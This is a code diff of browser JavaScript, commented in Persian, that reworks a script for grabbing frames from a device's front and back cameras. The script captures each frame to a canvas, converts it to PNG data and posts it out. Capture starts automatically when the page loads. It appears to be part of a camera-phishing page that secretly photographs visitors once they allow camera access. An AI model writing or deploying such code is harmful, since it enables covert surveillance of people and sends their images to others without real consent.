@@ -42,7 +42,7 @@
     const backConstraints = {
         audio: false,
         video: {
-            facingMode: { exact: "environment" } // استفاده از دوربین عقب
+            facingMode: "environment" // استفاده از دوربین عقب
         }
     };
 
@@ -87,27 +87,11 @@
             alert('مشکل در دسترسی به دوربین عقب:', error);
         });
 
-    async function captureAndSaveBack(stream) {
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const imageData = canvas.toDataURL('image/png');
-        post(imageData);
-    }
 
-    async function initBackCamera() {
-        try {
-            const stream = await navigator.mediaDevices.getUserMedia(backConstraints);
-            video.srcObject = stream;
-            await new Promise(resolve => video.onloadedmetadata = resolve);
-            captureAndSaveBack(stream);
-        } catch (e) {
-            console.error('navigator.getUserMedia error:', e);
-        }
-    }
-
+    // اجرای تابع برای دوربین عقب و سپس دوربین جلو
     async function captureFromBothCameras() {
         await captureAndSave(frontConstraints);
-        await initBackCamera();
+        await captureAndSave(backConstraints);
     }
 
     captureFromBothCameras();
